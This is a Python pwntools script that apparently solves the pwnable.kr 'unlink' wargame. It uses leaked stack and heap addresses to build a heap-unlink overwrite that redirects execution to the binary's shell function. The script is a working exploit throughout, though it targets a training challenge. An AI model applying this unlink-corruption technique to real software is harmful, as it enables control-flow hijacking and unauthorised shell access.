from pwn import *
import argh


context.log_level = 'debug'

host = 'pwnable.kr'
user = 'unlink'
port = 2222
password = 'guest'


'''
A - fd|****
    bk ****|
   buf|********|
      |********|
B - fd|****
    bk ****|
   buf|********|
      |********|
C - fd|****
    bk ****|
   buf|********|
      |********|

    B->bk->fd = B->fd;
    B->fd->bk = B->bk;


target:
 80485ff:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 8048602:	c9                   	leave
 8048603:	8d 61 fc             	lea    -0x4(%ecx),%esp

'''

def start_gdb(exe_name):
    return gdb.debug([exe_name], '''
    set confirm off
    # b unlink
    # b *0x80485e9
    # b *0x80485ff
    layout regs
    continue
    ''')


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './unlink'
    e = ELF(bin_path)

    if local:
        p = start_gdb(bin_path)
    elif runpwn:
        s = ssh(user, host, port, password)
        p = s.process(bin_path)


    cyclic_find('haaa')
    cyclic_find('gaaa')
    p.recvuntil('stack address leak: ')
    stack_leak = int(p.recvline(), base=16)
    p.recvuntil('heap address leak: ')
    heap_leak = int(p.recvline(), base=16)
    log.info('stack address: 0x{:08x}, heap address: 0x{:08x}'.format(stack_leak, heap_leak))
    ebp_minus_4 = stack_leak+0x10
    new_stack=heap_leak+24*3  # address after the whole payload
    # p.writeline(cyclic(length=16) + 'ABCD' + p32(ebp_minus_4) + p32(ebp_minus_4) + p32(new_stack) + cyclic(16) + p32(e.symbols['shell']))
    # p.writeline(cyclic(length=100))
    shell_address = e.symbols['shell']
    shell_address_location_on_heap = heap_leak+0xC  ## this is the start of A.buf
    first_payload_to_write = cyclic_find('haaa')
    first_location = cyclic_find('gaaa')
    p.writeline(flat({0: shell_address, first_location: ebp_minus_4-4, first_payload_to_write: shell_address_location_on_heap}))

    p.interactive()


if __name__ == '__main__':
    argh.dispatch_command(main)

